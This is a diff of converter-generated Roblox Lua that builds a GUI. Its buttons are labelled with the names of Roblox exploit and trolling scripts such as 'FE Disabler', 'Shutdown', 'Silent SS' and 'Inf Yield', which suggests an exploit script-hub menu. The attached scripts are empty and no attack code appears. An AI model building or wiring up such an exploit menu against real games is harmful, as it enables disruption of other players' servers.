-G2L["46"]["Text"] = [[HD Admin]];
+G2L["46"]["Text"] = [[Inf Yield]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -653,7 +610,7 @@ G2L["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["4a"] = Instance.new("TextButton", G2L["3b"]);
+G2L["4a"] = Instance.new("TextButton", G2L["1f"]);
 G2L["4a"]["TextWrapped"] = true;
 G2L["4a"]["BorderSizePixel"] = 0;
 G2L["4a"]["TextSize"] = 14;
@@ -664,7 +621,7 @@ G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["4a"]["BackgroundTransparency"] = 1;
 G2L["4a"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4a"]["Text"] = [[k00pGUI]];
+G2L["4a"]["Text"] = [[Silent SS]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -683,7 +640,7 @@ G2L["4d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["4e"] = Instance.new("TextButton", G2L["3b"]);
+G2L["4e"] = Instance.new("TextButton", G2L["1f"]);
 G2L["4e"]["TextWrapped"] = true;
 G2L["4e"]["BorderSizePixel"] = 0;
 G2L["4e"]["TextSize"] = 14;
@@ -694,7 +651,7 @@ G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["4e"]["BackgroundTransparency"] = 1;
 G2L["4e"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4e"]["Text"] = [[HappyHub]];
+G2L["4e"]["Text"] = [[l0stAdmin]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -713,7 +670,7 @@ G2L["51"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["52"] = Instance.new("TextButton", G2L["3b"]);
+G2L["52"] = Instance.new("TextButton", G2L["1f"]);
 G2L["52"]["TextWrapped"] = true;
 G2L["52"]["BorderSizePixel"] = 0;
 G2L["52"]["TextSize"] = 14;
@@ -724,7 +681,7 @@ G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["52"]["BackgroundTransparency"] = 1;
 G2L["52"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["52"]["Text"] = [[RC7]];
+G2L["52"]["Text"] = [[AntiSkid]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -743,7 +700,7 @@ G2L["55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["56"] = Instance.new("TextButton", G2L["3b"]);
+G2L["56"] = Instance.new("TextButton", G2L["1f"]);
 G2L["56"]["TextWrapped"] = true;
 G2L["56"]["BorderSizePixel"] = 0;
 G2L["56"]["TextSize"] = 14;
@@ -754,7 +711,7 @@ G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["56"]["BackgroundTransparency"] = 1;
 G2L["56"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["56"]["Text"] = [[KJ]];
+G2L["56"]["Text"] = [[Destroy All Sounds]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -773,7 +730,7 @@ G2L["59"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["5a"] = Instance.new("TextButton", G2L["3b"]);
+G2L["5a"] = Instance.new("TextButton", G2L["1f"]);
 G2L["5a"]["TextWrapped"] = true;
 G2L["5a"]["BorderSizePixel"] = 0;
 G2L["5a"]["TextSize"] = 14;
@@ -784,7 +741,7 @@ G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["5a"]["BackgroundTransparency"] = 1;
 G2L["5a"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5a"]["Text"] = [[Nuke]];
+G2L["5a"]["Text"] = [[Shutdown]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -803,7 +760,7 @@ G2L["5d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["5e"] = Instance.new("TextButton", G2L["3b"]);
+G2L["5e"] = Instance.new("TextButton", G2L["1f"]);
 G2L["5e"]["TextWrapped"] = true;
 G2L["5e"]["BorderSizePixel"] = 0;
 G2L["5e"]["TextSize"] = 14;
@@ -814,7 +771,7 @@ G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["5e"]["BackgroundTransparency"] = 1;
 G2L["5e"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5e"]["Text"] = [[c00lkidd music]];
+G2L["5e"]["Text"] = [[FE Disabler]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -833,7 +790,7 @@ G2L["61"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["62"] = Instance.new("TextButton", G2L["3b"]);
+G2L["62"] = Instance.new("TextButton", G2L["1f"]);
 G2L["62"]["TextWrapped"] = true;
 G2L["62"]["BorderSizePixel"] = 0;
 G2L["62"]["TextSize"] = 14;
@@ -844,7 +801,7 @@ G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["62"]["BackgroundTransparency"] = 1;
 G2L["62"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["62"]["Text"] = [[Inf Yield]];
+G2L["62"]["Text"] = [[Gojo]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -863,7 +820,7 @@ G2L["65"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["66"] = Instance.new("TextButton", G2L["3b"]);
+G2L["66"] = Instance.new("TextButton", G2L["1f"]);
 G2L["66"]["TextWrapped"] = true;
 G2L["66"]["BorderSizePixel"] = 0;
 G2L["66"]["TextSize"] = 14;
@@ -874,7 +831,7 @@ G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["66"]["BackgroundTransparency"] = 1;
 G2L["66"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["66"]["Text"] = [[Silent SS]];
+G2L["66"]["Text"] = [[Guns]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -893,7 +850,7 @@ G2L["69"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["6a"] = Instance.new("TextButton", G2L["3b"]);
+G2L["6a"] = Instance.new("TextButton", G2L["1f"]);
 G2L["6a"]["TextWrapped"] = true;
 G2L["6a"]["BorderSizePixel"] = 0;
 G2L["6a"]["TextSize"] = 14;
@@ -904,7 +861,7 @@ G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["6a"]["BackgroundTransparency"] = 1;
 G2L["6a"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6a"]["Text"] = [[l0stAdmin]];
+G2L["6a"]["Text"] = [[Screamer]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -923,7 +880,7 @@ G2L["6d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["6e"] = Instance.new("TextButton", G2L["3b"]);
+G2L["6e"] = Instance.new("TextButton", G2L["1f"]);
 G2L["6e"]["TextWrapped"] = true;
 G2L["6e"]["BorderSizePixel"] = 0;
 G2L["6e"]["TextSize"] = 14;
@@ -934,7 +891,7 @@ G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["6e"]["BackgroundTransparency"] = 1;
 G2L["6e"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6e"]["Text"] = [[AntiSkid]];
+G2L["6e"]["Text"] = [[Sensation]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -953,7 +910,7 @@ G2L["71"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["72"] = Instance.new("TextButton", G2L["3b"]);
+G2L["72"] = Instance.new("TextButton", G2L["1f"]);
 G2L["72"]["TextWrapped"] = true;
 G2L["72"]["BorderSizePixel"] = 0;
 G2L["72"]["TextSize"] = 14;
@@ -964,7 +921,7 @@ G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]
 G2L["72"]["BackgroundTransparency"] = 1;
 G2L["72"]["Size"] = UDim2.new(0, 361, 0, 33);
 G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["72"]["Text"] = [[Destroy All Sounds]];
+G2L["72"]["Text"] = [[Aureus]];
 
 
 -- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
@@ -982,581 +939,648 @@ G2L["75"] = Instance.new("UIStroke", G2L["72"]);
 G2L["75"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["76"] = Instance.new("TextButton", G2L["3b"]);
-G2L["76"]["TextWrapped"] = true;
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["76"] = Instance.new("ImageButton", G2L["3"]);
 G2L["76"]["BorderSizePixel"] = 0;
-G2L["76"]["TextSize"] = 14;
-G2L["76"]["TextScaled"] = true;
-G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["76"]["BackgroundTransparency"] = 1;
-G2L["76"]["Size"] = UDim2.new(0, 361, 0, 33);
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["76"]["Image"] = [[rbxassetid://11347112400]];
+G2L["76"]["Size"] = UDim2.new(0, 43, 0, 43);
 G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["76"]["Text"] = [[Shutdown]];
+G2L["76"]["Position"] = UDim2.new(0, 0, 0.12162, 0);
 
 
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
 G2L["77"] = Instance.new("LocalScript", G2L["76"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
 G2L["78"] = Instance.new("UIStroke", G2L["76"]);
 
 
 
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["79"] = Instance.new("UIStroke", G2L["76"]);
-G2L["79"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["7a"] = Instance.new("TextButton", G2L["3b"]);
-G2L["7a"]["TextWrapped"] = true;
-G2L["7a"]["BorderSizePixel"] = 0;
-G2L["7a"]["TextSize"] = 14;
-G2L["7a"]["TextScaled"] = true;
-G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["7a"]["BackgroundTransparency"] = 1;
-G2L["7a"]["Size"] = UDim2.new(0, 361, 0, 33);
-G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7a"]["Text"] = [[FE Disabler]];
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["7b"] = Instance.new("LocalScript", G2L["7a"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["7c"] = Instance.new("UIStroke", G2L["7a"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["7d"] = Instance.new("UIStroke", G2L["7a"]);
-G2L["7d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["7e"] = Instance.new("TextButton", G2L["3b"]);
-G2L["7e"]["TextWrapped"] = true;
-G2L["7e"]["BorderSizePixel"] = 0;
-G2L["7e"]["TextSize"] = 14;
-G2L["7e"]["TextScaled"] = true;
-G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["7e"]["BackgroundTransparency"] = 1;
-G2L["7e"]["Size"] = UDim2.new(0, 361, 0, 33);
-G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7e"]["Text"] = [[Gojo]];
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["7f"] = Instance.new("LocalScript", G2L["7e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["80"] = Instance.new("UIStroke", G2L["7e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["81"] = Instance.new("UIStroke", G2L["7e"]);
-G2L["81"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["82"] = Instance.new("TextButton", G2L["3b"]);
-G2L["82"]["TextWrapped"] = true;
-G2L["82"]["BorderSizePixel"] = 0;
-G2L["82"]["TextSize"] = 14;
-G2L["82"]["TextScaled"] = true;
-G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["82"]["BackgroundTransparency"] = 1;
-G2L["82"]["Size"] = UDim2.new(0, 361, 0, 33);
-G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["82"]["Text"] = [[Guns]];
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["83"] = Instance.new("LocalScript", G2L["82"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["84"] = Instance.new("UIStroke", G2L["82"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["85"] = Instance.new("UIStroke", G2L["82"]);
-G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["86"] = Instance.new("TextButton", G2L["3b"]);
-G2L["86"]["TextWrapped"] = true;
-G2L["86"]["BorderSizePixel"] = 0;
-G2L["86"]["TextSize"] = 14;
-G2L["86"]["TextScaled"] = true;
-G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["86"]["BackgroundTransparency"] = 1;
-G2L["86"]["Size"] = UDim2.new(0, 361, 0, 33);
-G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["86"]["Text"] = [[Screamer]];
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["87"] = Instance.new("LocalScript", G2L["86"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["88"] = Instance.new("UIStroke", G2L["86"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["89"] = Instance.new("UIStroke", G2L["86"]);
-G2L["89"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["8a"] = Instance.new("TextButton", G2L["3b"]);
-G2L["8a"]["TextWrapped"] = true;
-G2L["8a"]["BorderSizePixel"] = 0;
-G2L["8a"]["TextSize"] = 14;
-G2L["8a"]["TextScaled"] = true;
-G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["8a"]["BackgroundTransparency"] = 1;
-G2L["8a"]["Size"] = UDim2.new(0, 361, 0, 33);
-G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8a"]["Text"] = [[Sensation]];
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["8b"] = Instance.new("LocalScript", G2L["8a"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["8c"] = Instance.new("UIStroke", G2L["8a"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["8d"] = Instance.new("UIStroke", G2L["8a"]);
-G2L["8d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
-G2L["8e"] = Instance.new("TextButton", G2L["3b"]);
-G2L["8e"]["TextWrapped"] = true;
-G2L["8e"]["BorderSizePixel"] = 0;
-G2L["8e"]["TextSize"] = 14;
-G2L["8e"]["TextScaled"] = true;
-G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["8e"]["BackgroundTransparency"] = 1;
-G2L["8e"]["Size"] = UDim2.new(0, 361, 0, 33);
-G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8e"]["Text"] = [[Aureus]];
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["8f"] = Instance.new("LocalScript", G2L["8e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["90"] = Instance.new("UIStroke", G2L["8e"]);
-
-
-
--- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["91"] = Instance.new("UIStroke", G2L["8e"]);
-G2L["91"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
 -- StarterGui.ScreenGui.Frame.ImageButton
-G2L["92"] = Instance.new("ImageButton", G2L["3"]);
-G2L["92"]["BorderSizePixel"] = 0;
-G2L["92"]["BackgroundTransparency"] = 1;
+G2L["79"] = Instance.new("ImageButton", G2L["3"]);
+G2L["79"]["BorderSizePixel"] = 0;
+G2L["79"]["BackgroundTransparency"] = 1;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["92"]["Image"] = [[rbxassetid://11347112400]];
-G2L["92"]["Size"] = UDim2.new(0, 43, 0, 43);
-G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["92"]["Position"] = UDim2.new(0, 0, 0.12162, 0);
+G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["79"]["Image"] = [[rbxassetid://11570895459]];
+G2L["79"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["79"]["Position"] = UDim2.new(0, 0, 0.26689, 0);
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["93"] = Instance.new("LocalScript", G2L["92"]);
+G2L["7a"] = Instance.new("LocalScript", G2L["79"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["94"] = Instance.new("UIStroke", G2L["92"]);
+G2L["7b"] = Instance.new("UIStroke", G2L["79"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton
-G2L["95"] = Instance.new("ImageButton", G2L["3"]);
-G2L["95"]["BorderSizePixel"] = 0;
-G2L["95"]["BackgroundTransparency"] = 1;
+G2L["7c"] = Instance.new("ImageButton", G2L["3"]);
+G2L["7c"]["BorderSizePixel"] = 0;
+G2L["7c"]["BackgroundTransparency"] = 1;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["95"]["Image"] = [[rbxassetid://11570895459]];
-G2L["95"]["Size"] = UDim2.new(0, 43, 0, 43);
-G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["95"]["Position"] = UDim2.new(0, 0, 0.26689, 0);
+G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7c"]["Image"] = [[rbxassetid://1365082776]];
+G2L["7c"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7c"]["Position"] = UDim2.new(0, 0, 0.41216, 0);
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["96"] = Instance.new("LocalScript", G2L["95"]);
+G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["97"] = Instance.new("UIStroke", G2L["95"]);
-
-
-
--- StarterGui.ScreenGui.Frame.ImageButton
-G2L["98"] = Instance.new("ImageButton", G2L["3"]);
-G2L["98"]["BorderSizePixel"] = 0;
-G2L["98"]["BackgroundTransparency"] = 1;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["98"]["Image"] = [[rbxassetid://1365082776]];
-G2L["98"]["Size"] = UDim2.new(0, 43, 0, 43);
-G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["98"]["Position"] = UDim2.new(0, 0, 0.41216, 0);
-
-
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-G2L["99"] = Instance.new("LocalScript", G2L["98"]);
-
-
-
--- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
-G2L["9a"] = Instance.new("UIStroke", G2L["98"]);
+G2L["7e"] = Instance.new("UIStroke", G2L["7c"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.page4
-G2L["9b"] = Instance.new("Frame", G2L["3"]);
-G2L["9b"]["Visible"] = false;
-G2L["9b"]["BorderSizePixel"] = 0;
-G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
-G2L["9b"]["Size"] = UDim2.new(0, 361, 0, 260);
-G2L["9b"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
-G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9b"]["Name"] = [[page4]];
-G2L["9b"]["BackgroundTransparency"] = 0.5;
+G2L["7f"] = Instance.new("Frame", G2L["3"]);
+G2L["7f"]["Visible"] = false;
+G2L["7f"]["BorderSizePixel"] = 0;
+G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["7f"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["7f"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
+G2L["7f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7f"]["Name"] = [[page4]];
+G2L["7f"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.ScreenGui.Frame.page4.ScrollingFrame
-G2L["9c"] = Instance.new("ScrollingFrame", G2L["9b"]);
-G2L["9c"]["Active"] = true;
-G2L["9c"]["BorderSizePixel"] = 0;
-G2L["9c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9c"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
-G2L["9c"]["Size"] = UDim2.new(0, 361, 0, 260);
-G2L["9c"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9c"]["ScrollBarThickness"] = 3;
-G2L["9c"]["BackgroundTransparency"] = 1;
+G2L["80"] = Instance.new("ScrollingFrame", G2L["7f"]);
+G2L["80"]["Active"] = true;
+G2L["80"]["BorderSizePixel"] = 0;
+G2L["80"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+G2L["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["80"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
+G2L["80"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["80"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["80"]["ScrollBarThickness"] = 3;
+G2L["80"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
-G2L["9d"] = Instance.new("LocalScript", G2L["9c"]);
+G2L["81"] = Instance.new("LocalScript", G2L["80"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.UIListLayout
-G2L["9e"] = Instance.new("UIListLayout", G2L["9c"]);
-G2L["9e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["82"] = Instance.new("UIListLayout", G2L["80"]);
+G2L["82"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton
-G2L["9f"] = Instance.new("ImageButton", G2L["3"]);
-G2L["9f"]["BorderSizePixel"] = 0;
-G2L["9f"]["BackgroundTransparency"] = 1;
+G2L["83"] = Instance.new("ImageButton", G2L["3"]);
+G2L["83"]["BorderSizePixel"] = 0;
+G2L["83"]["BackgroundTransparency"] = 1;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9f"]["Image"] = [[rbxassetid://101630023371308]];
-G2L["9f"]["Size"] = UDim2.new(0, 43, 0, 43);
-G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9f"]["Position"] = UDim2.new(0, 0, 0.55743, 0);
+G2L["83"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["83"]["Image"] = [[rbxassetid://101630023371308]];
+G2L["83"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["83"]["Position"] = UDim2.new(0, 0, 0.55743, 0);
 
 
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
